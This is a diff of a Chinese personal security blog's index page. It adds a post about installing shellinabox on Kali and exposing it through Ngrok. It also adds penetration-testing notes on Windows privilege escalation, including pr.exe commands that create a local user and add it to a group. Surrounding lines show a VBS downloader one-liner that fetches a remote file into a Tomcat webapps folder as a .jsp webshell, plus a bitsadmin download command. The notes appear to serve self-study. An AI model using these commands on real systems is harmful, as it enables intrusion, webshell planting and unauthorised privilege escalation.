@@ -330,6 +330,189 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content="Freedom as Autonomy">
+      <meta itemprop="image" content="/images/cat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/" class="post-title-link" itemprop="url">'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-21 19:49:19" itemprop="dateCreated datePublished" datetime="2019-03-21T19:49:19+08:00">2019-03-21</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-04 19:22:30" itemprop="dateModified" datetime="2019-07-04T19:22:30+08:00">2019-07-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/工具使用/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="1-shellinabox介绍"><a href="#1-shellinabox介绍" class="headerlink" title="1.shellinabox介绍"></a>1.shellinabox介绍</h1><p>Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>，在启用了SSL/TLS证书，需要用<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>来登录。默认情况下shellinabox使用的是4200端口。</p>
+<h1 id="2-shellinabox安装"><a href="#2-shellinabox安装" class="headerlink" title="2.shellinabox安装"></a>2.shellinabox安装</h1><p>使用的是系统是Kali Linux 2019，在终端输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install shellinabox</span><br></pre></td></tr></table></figure>
+<p>如果提示无法找到包，请添加国内更新源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br><span class="line">//添加下列更新源</span><br><span class="line">#清华大学 [更新源]</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"></span><br><span class="line">#浙江大学[更新源]</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/18/Brief-Introduction-on-Medusa&Hydra/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -806,7 +989,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-01 21:35:16" itemprop="dateModified" datetime="2019-07-01T21:35:16+08:00">2019-07-01</time>
+                <time title="Modified: 2019-07-09 09:56:54" itemprop="dateModified" datetime="2019-07-09T09:56:54+08:00">2019-07-09</time>
               
             
           </span>
@@ -973,7 +1156,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-07 22:00:32" itemprop="dateModified" datetime="2019-07-07T22:00:32+08:00">2019-07-07</time>
+                <time title="Modified: 2019-07-08 10:56:32" itemprop="dateModified" datetime="2019-07-08T10:56:32+08:00">2019-07-08</time>
               
             
           </span>
@@ -1065,6 +1248,7 @@
 <h1 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h1><h2 id="WebShell的权限"><a href="#WebShell的权限" class="headerlink" title="WebShell的权限"></a>WebShell的权限</h2><p>Webshell的权限一般是由解析执行WebShell的Web容器自身权限决定的<br>如果是linux做了操作系统加固 能上传 但是只能执行系统命令权限 但是无法获得shell那就说明做了目录权限加固但是没有做中间件加固（可上传）没做操作系统加固<br>目录加固的权限是可读可执行但不可写</p>
 <h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="PowerShell提权"><a href="#PowerShell提权" class="headerlink" title="PowerShell提权"></a>PowerShell提权</h2><h2 id="DOS下载文件"><a href="#DOS下载文件" class="headerlink" title="DOS下载文件"></a>DOS下载文件</h2><h3 id="1-创建downfile-vbs下载文件"><a href="#1-创建downfile-vbs下载文件" class="headerlink" title="1.创建downfile.vbs下载文件"></a>1.创建downfile.vbs下载文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2  &gt;&gt; downfile.vbs</span><br><span class="line">cscript downfile.vbs http://192.168.40.13:9090/fileLibrary/5d5X9mSTZXjH9VlhXNN/x.txt D:\\tomcat8.5\\webapps\\x.jsp</span><br></pre></td></tr></table></figure>
 <h3 id="2-使用bitsadmin命令"><a href="#2-使用bitsadmin命令" class="headerlink" title="2.使用bitsadmin命令"></a>2.使用bitsadmin命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure>
+<h2 id="PR提权"><a href="#PR提权" class="headerlink" title="PR提权"></a>PR提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pr.exe &quot;net user chessur 123.com /add&quot; 添加用户</span><br><span class="line">pr.exe &quot;net localgroup chessur /add&quot; 将用户加入管理员组</span><br></pre></td></tr></table></figure>
 <h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等）。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。</p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="员工信息"><a href="#员工信息" class="headerlink" title="员工信息"></a>员工信息</h2><p>社交关系网<br>博客<br>工资银行账户</p>
 <p>企业使用软件信息<br>业务伙伴<br>销售银行账号<br>招聘岗位</p>
@@ -1158,7 +1342,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-count">35</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
